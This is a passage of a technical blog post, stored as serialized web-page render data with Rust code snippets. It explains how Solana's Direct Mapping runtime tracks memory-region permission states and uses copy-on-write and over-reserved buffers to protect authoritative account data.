token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"u64\"]}],[\"$\",\"span\",\"code-segement18\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003e\"]}],[\"$\",\"span\",\"code-segement19\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}],[\"$\",\"span\",\"code-segement20\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"     \"]}],[\"$\",\"span\",\"code-segement21\",{\"className\":\"token token\",\"style\":{\"color\":\"#999\"},\"children\":[\"// start host address\"]}],[\"$\",\"span\",\"code-segement22\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--3\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[3]}],[\"$\",\"span\",\"code-segement24\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    \"]}],[\"$\",\"span\",\"code-segement25\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"pub\"]}],[\"$\",\"span\",\"code-segement26\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" vm_addr\"]}],[\"$\",\"span\",\"code-segement27\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\":\"]}],[\"$\",\"span\",\"code-segement28\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement29\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"u64\"]}],[\"$\",\"span\",\"code-segement30\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}],[\"$\",\"span\",\"code-segement31\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"             \"]}],[\"$\",\"span\",\"code-segement32\",{\"className\":\"token token\",\"style\":{\"color\":\"#999\"},\"children\":[\"// start virtual address\"]}],[\"$\",\"span\",\"code-segement33\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--4\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[4]}],[\"$\",\"span\",\"code-segement35\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    \"]}],[\"$\",\"span\",\"code-segement36\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"pub\"]}],[\"$\",\"span\",\"code-segement37\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" vm_addr_end\"]}],[\"$\",\"span\",\"code-segement38\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\":\"]}],[\"$\",\"span\",\"code-segement39\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement40\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"u64\"]}],[\"$\",\"span\",\"code-segement41\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}],[\"$\",\"span\",\"code-segement42\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"         \"]}],[\"$\",\"span\",\"code-segement43\",{\"className\":\"token token\",\"style\":{\"color\":\"#999\"},\"children\":[\"// end virtual address\"]}],[\"$\",\"span\",\"code-segement44\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--5\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[5]}],[\"$\",\"span\",\"code-segement46\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    \"]}],[\"$\",\"span\",\"code-segement47\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"pub\"]}],[\"$\",\"span\",\"code-segement48\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" len\"]}],[\"$\",\"span\",\"code-segement49\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\":\"]}],[\"$\",\"span\",\"code-segement50\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement51\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"u64\"]}],[\"$\",\"span\",\"code-segement52\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}],[\"$\",\"span\",\"code-segement53\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"                 \"]}],[\"$\",\"span\",\"code-segement54\",{\"className\":\"token token\",\"style\":{\"color\":\"#999\"},\"children\":[\"// Length in bytes\"]}],[\"$\",\"span\",\"code-segement55\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--6\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[6]}],[\"$\",\"span\",\"code-segement57\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    \"]}],[\"$\",\"span\",\"code-segement58\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"pub\"]}],[\"$\",\"span\",\"code-segement59\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" vm_gap_shift\"]}],[\"$\",\"span\",\"code-segement60\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\":\"]}],[\"$\",\"span\",\"code-segement61\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement62\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"u8\"]}],[\"$\",\"span\",\"code-segement63\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}],[\"$\",\"span\",\"code-segement64\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"         \"]}],[\"$\",\"span\",\"code-segement65\",{\"className\":\"token token\",\"style\":{\"color\":\"#999\"},\"children\":[\"// Address translation parameters\"]}],[\"$\",\"span\",\"code-segement66\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--7\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[7]}],[\"$\",\"span\",\"code-segement68\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    \"]}],[\"$\",\"span\",\"code-segement69\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"pub\"]}],[\"$\",\"span\",\"code-segement70\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" state\"]}],[\"$\",\"span\",\"code-segement71\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\":\"]}],[\"$\",\"span\",\"code-segement72\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement73\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"Cell\"]}],[\"$\",\"span\",\"code-segement74\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003c\"]}],[\"$\",\"span\",\"code-segement75\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"MemoryState\"]}],[\"$\",\"span\",\"code-segement76\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003e\"]}],[\"$\",\"span\",\"code-segement77\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}],[\"$\",\"span\",\"code-segement78\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement79\",{\"className\":\"token token\",\"style\":{\"color\":\"#999\"},\"children\":[\"// Permission tracking\"]}],[\"$\",\"span\",\"code-segement80\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--8\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[8]}],[\"$\",\"span\",\"code-segement82\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\"]}],[\"$\",\"span\",\"code-segement83\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"}\"]}],[\"$\",\"span\",\"code-segement84\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--9\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[9]}],\"\\n\",[\"$\",\"span\",\"line-number--10\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[10]}],[\"$\",\"span\",\"code-segement88\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\"]}],[\"$\",\"span\",\"code-segement89\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"pub\"]}],[\"$\",\"span\",\"code-segement90\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement91\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"enum\"]}],[\"$\",\"span\",\"code-segement92\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement93\",{\"className\":\"token token type-definition\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"MemoryState\"]}],[\"$\",\"span\",\"code-segement94\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement95\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"{\"]}],[\"$\",\"span\",\"code-segement96\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--11\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[11]}],[\"$\",\"span\",\"code-segement98\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    \"]}],[\"$\",\"span\",\"code-segement99\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"Readable\"]}],[\"$\",\"span\",\"code-segement100\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}],[\"$\",\"span\",\"code-segement101\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"   \"]}],[\"$\",\"span\",\"code-segement102\",{\"className\":\"token token\",\"style\":{\"color\":\"#999\"},\"children\":[\"// The memory region is readable\"]}],[\"$\",\"span\",\"code-segement103\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--12\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[12]}],[\"$\",\"span\",\"code-segement105\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    \"]}],[\"$\",\"span\",\"code-segement106\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"Writable\"]}],[\"$\",\"span\",\"code-segement107\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}],[\"$\",\"span\",\"code-segement108\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"   \"]}],[\"$\",\"span\",\"code-segement109\",{\"className\":\"token token\",\"style\":{\"color\":\"#999\"},\"children\":[\"// The memory region is writable\"]}],[\"$\",\"span\",\"code-segement110\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--13\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[13]}],[\"$\",\"span\",\"code-segement112\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    \"]}],[\"$\",\"span\",\"code-segement113\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"Cow\"]}],[\"$\",\"span\",\"code-segement114\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement115\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"u64\"]}],[\"$\",\"span\",\"code-segement116\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement117\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}],[\"$\",\"span\",\"code-segement118\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"   \"]}],[\"$\",\"span\",\"code-segement119\",{\"className\":\"token token\",\"style\":{\"color\":\"#999\"},\"children\":[\"// The memory region is writable but must be copied before writing\"]}],[\"$\",\"span\",\"code-segement120\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--14\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[14]}],[\"$\",\"span\",\"code-segement122\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\"]}],[\"$\",\"span\",\"code-segement123\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"}\"]}]]]}]}]}],\"\\n\",[\"$\",\"p\",\"p-66\",{\"className\":\"text-xl py-3 text-pretty sm:text-justify\",\"children\":[\"Each \",[\"$\",\"code\",\"code-0\",{\"className\":\"break-all rounded-sm px-1 py-0.4 border border-gray-600\",\"style\":{\"background\":\"#2d2d2d\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"18px\"},\"children\":\"MemoryRegion\"}],\" now tracks its permission state and enforces access controls on data writes. When a program tries to write to account data, the runtime immediately checks the region's state and either allows the write, triggers a copy-on-write operation, or rejects the access entirely.\"]}],\"\\n\",[\"$\",\"p\",\"p-67\",{\"className\":\"text-xl py-3 text-pretty sm:text-justify\",\"children\":[\"The key change is the addition of the \",[\"$\",\"code\",\"code-0\",{\"className\":\"break-all rounded-sm px-1 py-0.4 border border-gray-600\",\"style\":{\"background\":\"#2d2d2d\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"18px\"},\"children\":\"state\"}],\" field that replaces the simple \",[\"$\",\"code\",\"code-1\",{\"className\":\"break-all rounded-sm px-1 py-0.4 border border-gray-600\",\"style\":{\"background\":\"#2d2d2d\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"18px\"},\"children\":\"is_writable\"}],\" boolean. This allows for more sophisticated permission management, particularly the \",[\"$\",\"code\",\"code-2\",{\"className\":\"break-all rounded-sm px-1 py-0.4 border border-gray-600\",\"style\":{\"background\":\"#2d2d2d\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"18px\"},\"children\":\"Cow(u64)\"}],\" state that triggers copy-on-write operations when needed.\"]}],\"\\n\",[\"$\",\"h3\",\"h3-15\",{\"className\":\"text-3xl py-4 border-b border-white/10\",\"children\":\"Copy-on-Write (CoW) Strategy\"}],\"\\n\",[\"$\",\"p\",\"p-68\",{\"className\":\"text-xl py-3 text-pretty sm:text-justify\",\"children\":\"Now let's start discussing why an additional copy-on-write state is required.\"}],\"\\n\",[\"$\",\"h4\",\"h4-7\",{\"className\":\"text-2xl py-4 border-b border-white/10\",\"children\":\"Avoid Authoritative Data Contamination\"}],\"\\n\",[\"$\",\"p\",\"p-69\",{\"className\":\"text-xl py-3 text-pretty sm:text-justify\",\"children\":[\"Aside from plain read and write authorization, Direct Mapping introduces an even greater problem, the rollback of changes on transaction reverts. But why is this a problem? Aren't the \",[\"$\",\"code\",\"code-0\",{\"className\":\"break-all rounded-sm px-1 py-0.4 border border-gray-600\",\"style\":{\"background\":\"#2d2d2d\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"18px\"},\"children\":\"AccountSharedDatas\"}],\" in \",[\"$\",\"code\",\"code-1\",{\"className\":\"break-all rounded-sm px-1 py-0.4 border border-gray-600\",\"style\":{\"background\":\"#2d2d2d\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"18px\"},\"children\":\"TransactionContext\"}],\" already a cache? This boils down to some details of \",[\"$\",\"code\",\"code-2\",{\"className\":\"break-all rounded-sm px-1 py-0.4 border border-gray-600\",\"style\":{\"background\":\"#2d2d2d\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"18px\"},\"children\":\"TransactionContext\"}],\" that we ommitted earlier.\"]}],\"\\n\",[\"$\",\"p\",\"p-70\",{\"className\":\"text-xl py-3 text-pretty sm:text-justify\",\"children\":[\"When \",[\"$\",\"code\",\"code-0\",{\"className\":\"break-all rounded-sm px-1 py-0.4 border border-gray-600\",\"style\":{\"background\":\"#2d2d2d\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"18px\"},\"children\":\"TransactionContext\"}],\" and \",[\"$\",\"code\",\"code-1\",{\"className\":\"break-all rounded-sm px-1 py-0.4 border border-gray-600\",\"style\":{\"background\":\"#2d2d2d\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"18px\"},\"children\":\"AccountSharedData\"}],\" are first created, \",[\"$\",\"code\",\"code-2\",{\"className\":\"break-all rounded-sm px-1 py-0.4 border border-gray-600\",\"style\":{\"background\":\"#2d2d2d\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"18px\"},\"children\":\"AccountSharedData.data\"}],\" actually points to the authoritative account data of the persistent storage (notice \",[\"$\",\"code\",\"code-3\",{\"className\":\"break-all rounded-sm px-1 py-0.4 border border-gray-600\",\"style\":{\"background\":\"#2d2d2d\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"18px\"},\"children\":\"AccountSharedData\"}],\" is an \",[\"$\",\"code\",\"code-4\",{\"className\":\"break-all rounded-sm px-1 py-0.4 border border-gray-600\",\"style\":{\"background\":\"#2d2d2d\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"18px\"},\"children\":\"Arc::\u003cVec\u003cu8\u003e\u003e\"}],\"). Upon flushing account changes to \",[\"$\",\"code\",\"code-5\",{\"className\":\"break-all rounded-sm px-1 py-0.4 border border-gray-600\",\"style\":{\"background\":\"#2d2d2d\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"18px\"},\"children\":\"AccountSharedData\"}],\" on CPI or instruction boundaries, if the data is modified, \",[\"$\",\"code\",\"code-6\",{\"className\":\"break-all rounded-sm px-1 py-0.4 border border-gray-600\",\"style\":{\"background\":\"#2d2d2d\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"18px\"},\"children\":\"Arc::make_mut\"}],\" will be called to create a copy of the data to avoid contamination of the authoritative copy. This is effectively a copy-on-write mechanism to prevent \",[\"$\",\"code\",\"code-7\",{\"className\":\"break-all rounded-sm px-1 py-0.4 border border-gray-600\",\"style\":{\"background\":\"#2d2d2d\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"18px\"},\"children\":\"TransactionContext\"}],\" from having to clone all account data. The effectiveness is however limited by the need to serialize data into VMs.\"]}],\"\\n\",[\"$\",\"p\",\"p-71\",{\"className\":\"text-xl py-3 text-pretty sm:text-justify\",\"children\":[\"With Direct Mapping, the serialization is removed, allowing us to fully enjoy the benifits copy-on-write brings, but it is also no longer possible to rely on calling \",[\"$\",\"code\",\"code-0\",{\"className\":\"break-all rounded-sm px-1 py-0.4 border border-gray-600\",\"style\":{\"background\":\"#2d2d2d\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"18px\"},\"children\":\"Arc::make_mut\"}],\" on CPI and instruction boundaries to protect the authoritative copy. Instead, the copy-on-write mechanism needs to be inlined into the timely memory access verfications.\"]}],\"\\n\",[\"$\",\"p\",\"p-72\",{\"className\":\"text-xl py-3 text-pretty sm:text-justify\",\"children\":[\"This is where the copy-on-write state comes in handy. By adding a dedicated state, Solana can differentiate between first and latter writes to account data. First writes will see a \",[\"$\",\"code\",\"code-0\",{\"className\":\"break-all rounded-sm px-1 py-0.4 border border-gray-600\",\"style\":{\"background\":\"#2d2d2d\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"18px\"},\"children\":\"MemoryRegion\"}],\" of the state \",[\"$\",\"code\",\"code-1\",{\"className\":\"break-all rounded-sm px-1 py-0.4 border border-gray-600\",\"style\":{\"background\":\"#2d2d2d\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"18px\"},\"children\":\"CoW\"}],\" and consequently make a copy of the data buffer and update the state. Latter writes will then see a state of \",[\"$\",\"code\",\"code-2\",{\"className\":\"break-all rounded-sm px-1 py-0.4 border border-gray-600\",\"style\":{\"background\":\"#2d2d2d\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"18px\"},\"children\":\"Writable\"}],\", and know that we're already operating on a dedicated copy and no longer need to worry about contanimating authoritative data.\"]}],\"\\n\",[\"$\",\"h4\",\"h4-8\",{\"className\":\"text-2xl py-4 border-b border-white/10\",\"children\":\"Buffer Reallocation Management\"}],\"\\n\",[\"$\",\"p\",\"p-73\",{\"className\":\"text-xl py-3 text-pretty sm:text-justify\",\"children\":[\"Naturally, with the Direct Mapping enabled, we'd also need to address account data growth possibilities. A naive approach would be to resize the underlying \",[\"$\",\"code\",\"code-0\",{\"className\":\"break-all rounded-sm px-1 py-0.4 border border-gray-600\",\"style\":{\"background\":\"#2d2d2d\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"18px\"},\"children\":\"AccountSharedData\"}],\" buffer whenever more space is required. This approach is inefficient, however, since each resize might introduce a realloc of the data buffer, and in turn, require a copy of the data. Frequent copies defeat the entire purpose of the Direct Mapping optimization.\"]}],\"\\n\",[\"$\",\"p\",\"p-74\",{\"className\":\"text-xl py-3 text-pretty sm:text-justify\",\"children\":[\"Solana's approach is to instead over-reserve the reallocated buffer size. On the first copy of the data (i.e. copy-on-write), the \",[\"$\",\"code\",\"code-0\",{\"className\":\"break-all rounded-sm px-1 py-0.4 border border-gray-600\",\"style\":{\"background\":\"#2d2d2d\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"18px\"},\"children\":\"AccountSharedData.data\"}],\" reserves a buffer big enough to accommodate the max account data growth allowed by a transaction. This removes the need to constantly reallocate the buffer.\"]}],\"\\n\",[\"$\",\"p\",\"p-75\",{\"className\":\"text-xl py-3 text-pretty sm:text-justify\",\"children\":[\"$\",\"img\",\"img-0\",{\"src\":\"/blog/2025_06_27/copy_on_write.png\",\"alt\":\"Copy on Write\"}]}],\"\\n\",[\"$\",\"p\",\"p-76\",{\"className\":\"text-xl py-3 text-pretty sm:text-justify\",\"children\":[\"Summarizing the ideas, copy-on-write under Direct Mapping appears as shown in the diagram above, where \",[\"$\",\"code\",\"code-0\",{\"className\":\"break-all rounded-sm px-1 py-0.4 border border-gray-600\",\"style\":{\"background\":\"#2d2d2d\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"18px\"},\"children\":\"AccountSharedData\"}],\" may have it's \",[\"$\",\"code\",\"code-1\",{\"className\":\"break-all rounded-sm px-1 py-0.4 border border-gray-600\",\"style\":{\"background\":\"#2d2d2d\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"18px\"},\"children\":\"data\"}],\" vector clones, and \",[\"$\",\"code\",\"code-2\",{\"className\":\"break-all rounded-sm px-1 py-0.4 border border-gray-600\",\"style\":{\"background\":\"#2d2d2d\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"18px\"},\"children\":\"MemoryRegion\"}],\" must have its \",[\"$\",\"code\",\"code-3\",{\"className\":\"break-all rounded-sm px-1 py-0.4 border border-gray-600\",\"style\":{\"background\":\"#2d2d2d\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"18px\"},\"children\":\"Host_Addr\"}],\" updated accordingly.\"]}],\"\\n\",[\"$\",\"p\",\"p-77\",{\"className\":\"text-xl py-3 text-pretty sm:text-justify\",\"children\":[\"For reference, the code for writing to virtual memory now looks like this. Where memory access authorization is checked inline, and a callback function is used to update \",[\"$\",\"code\",\"code-0\",{\"className\":\"break-all rounded-sm px-1 py-0.4 border border-gray-600\",\"style\":{\"background\":\"#2d2d2d\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"18px\"},\"children\":\"MemoryRegion\"}],\" and \",[\"$\",\"code\",\"code-1\",{\"className\":\"break-all rounded-sm px-1 py-0.4 border border-gray-600\",\"style\":{\"background\":\"#2d2d2d\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"18px\"},\"children\":\"AccountSharedData.data\"}],\" for buffers in CoW state.\"]}],\"\\n\",[\"$\",\"pre\",\"pre-9\",{\"children\":[\"$\",\"div\",\"code-0\",{\"className\":\"rounded-sm\",\"style\":{\"color\":\"#ccc\",\"background\":\"#2d2d2d\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"1em\",\"textAlign\":\"left\",\"whiteSpace\":\"pre\",\"wordSpacing\":\"normal\",\"wordBreak\":\"normal\",\"wordWrap\":\"normal\",\"lineHeight\":\"1.5\",\"MozTabSize\":\"4\",\"OTabSize\":\"4\",\"tabSize\":\"4\",\"WebkitHyphens\":\"none\",\"MozHyphens\":\"none\",\"msHyphens\":\"none\",\"hyphens\":\"none\",\"padding\":\"1em\",\"margin\":\".5em 0\",\"overflow\":\"auto\"},\"children\":[\"$\",\"code\",null,{\"className\":\"language-rust\",\"style\":{\"whiteSpace\":\"pre\",\"color\":\"#ccc\",\"background\":\"none\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"1em\",\"textAlign\":\"left\",\"wordSpacing\":\"normal\",\"wordBreak\":\"normal\",\"wordWrap\":\"normal\",\"lineHeight\":\"1.5\",\"MozTabSize\":\"4\",\"OTabSize\":\"4\",\"tabSize\":\"4\",\"WebkitHyphens\":\"none\",\"MozHyphens\":\"none\",\"msHyphens\":\"none\",\"hyphens\":\"none\"},\"children\":[false,[[\"$\",\"span\",\"line-number--1\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[1]}],[\"$\",\"span\",\"code-segement1\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"pub\"]}],[\"$\",\"span\",\"code-segement2\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement3\",{\"className\":\"token 